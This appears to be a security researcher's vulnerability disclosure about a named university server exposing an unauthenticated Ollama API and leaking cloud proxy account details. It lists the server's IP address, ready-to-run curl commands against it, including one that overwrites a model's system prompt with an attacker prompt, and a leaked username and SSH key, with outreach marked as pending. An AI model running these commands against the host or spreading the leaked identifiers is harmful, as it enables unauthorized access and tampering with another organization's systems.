# Columbia University — Unauthenticated Ollama + Cloud Proxy Credential Leak

_NuClide Research · 2026-05-01_

---

## Summary

Columbia University server running Open WebUI v0.8.12 (auth enabled) with raw Ollama API (port 11434) exposed to the public internet. One active cloud proxy subscription (DeepSeek) accessible without authentication. Cloud proxy 401 response leaks Ollama Connect username and SSH public key.

---

## Infrastructure

| Field | Value |
|---|---|
| IP | 128.59.106.97 |
| rDNS | dyn-128-59-106-97.dyn.columbia.edu |
| Org | Columbia University |
| Country | US — New York |
| Open ports | 3000 (Open WebUI), 11434 (Ollama — **public**) |

---

## Models

| Model | Size | Type |
|---|---|---|
| deepseek-v4-pro:cloud | 0 GB | ☁️ Cloud proxy — DeepSeek API |
| qwen2.5:7b | 4 GB | Local |
| qwen2.5:32b-instruct-q4_K_M | 18 GB | Local |
| qwen2.5:14b | 8 GB | Local |
| qwen2.5:14b-instruct-q4_K_M | 8 GB | Local |
| llama3.2-vision:latest | 7 GB | Local |

---

## Findings

### F1 — Unauthenticated Ollama API (CRITICAL)

Open WebUI auth on port 3000 does not protect raw Ollama port 11434.

```bash
curl http://128.59.106.97:11434/api/tags          # model list — no auth
curl http://128.59.106.97:11434/api/show -d '{"model":"qwen2.5:32b-instruct-q4_K_M"}'
# model injection (CVE-2025-63389):
curl -X POST http://128.59.106.97:11434/api/create \
  -d '{"model":"qwen2.5:7b","from":"qwen2.5:7b","system":"[attacker prompt]"}'
```

### F2 — Cloud Proxy Credential Leak (HIGH)

DeepSeek cloud proxy returns 401 with Ollama Connect credentials in response body:

```json
{
  "error": "unauthorized",
  "signin_url": "https://ollama.com/connect?name=seascvn066&key=<base64>"
}
```

Decoded:
- **Username:** `seascvn066`
- **SSH pubkey:** `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMgKyjVvSEr13H03652CBNEckNUiTj/xgh8i5vKcxO4`

---

## Remediation

```bash
OLLAMA_HOST=127.0.0.1:11434
systemctl restart ollama
```

---

## Disclosure

- **Discovered:** 2026-05-01
- **Status:** Pending outreach to Columbia IT Security
